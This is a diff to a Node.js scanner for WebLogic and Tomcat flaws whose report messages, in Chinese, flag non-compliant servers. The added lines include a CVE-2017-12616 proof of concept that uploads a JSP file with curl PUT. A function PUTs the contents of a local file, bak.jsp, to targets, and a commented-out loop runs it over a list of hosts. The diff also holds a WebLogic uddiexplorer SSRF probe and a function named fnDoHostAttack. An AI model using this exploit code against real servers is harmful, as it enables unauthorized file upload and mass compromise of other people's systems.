@@ -213,7 +213,7 @@ function fnDoHostAttack(url,fnCbk)
 	if(bRunHost)return;
 	bRunHost = true;
 	try{
-		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
+		var uO = urlObj.parse(url), ss = "I.am.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
 		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
 		// checkWeblogicT3(host,port);
 
@@ -1415,8 +1415,8 @@ function testWeblogic(url,fnCbk)
 {
 	var s = url, i = url.indexOf('/',10), szCs,szCs2;
 	if(0 < i)s = s.substr(0, i);
-	szCs = s + "/console"
-	szCs2 = s + "/manager"
+	szCs = s + "/console/"
+	szCs2 = s + "/manager/"
 	
 	s += "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001";
 	// console.log(s)
@@ -1437,7 +1437,7 @@ function testWeblogic(url,fnCbk)
 	});
 	request(fnOptHeader({method:"GET",uri:szCs2}),function(e,r,b)
 	{
-		if(r && 200 == r.statusCode)
+		if(r && 200 == r.statusCode && -1 < String(b).indexOf("manager"))
 		{
 			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制"};
 		}
@@ -1530,6 +1530,8 @@ CVE-2017-12616 poc
             <param-value>false</param-value>
         </init-param>
 2、http://............../
+curl -X PUT "http://127.0.0.1:8080/123.jsp/" -d '<%out.println("test");%>'
+http://127.0.0.1:8080/123.jsp
 */
 var szCode = fs.readFileSync(__dirname + "/bak.jsp").toString();
 function fnMyPut(url)
@@ -1546,6 +1548,7 @@ function fnMyPut(url)
 			{
 				var oT = g_oRst["tomcat"] || {};
 				oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
+				console.log(oT["CVE-2017-12616"]);
 				g_oRst["tomcat"] = oT;
 			}
 		});
@@ -1674,6 +1677,16 @@ for(var k in kk)
 		console.log(k);
 	// else console.log(kk[k]);
 }
+
+/*
+var a = fs.readFileSync("./nwTomcat.txt").toString().trim().split("\n");
+for(var k in a)
+{
+	var s = "http://" + a[k] + "manager/";
+	console.log(s);
+	fnMyPut(s);
+}
+/////////////*/
 /*
 s2-045
 node checkUrl.js http://192.168.24.67:22245/
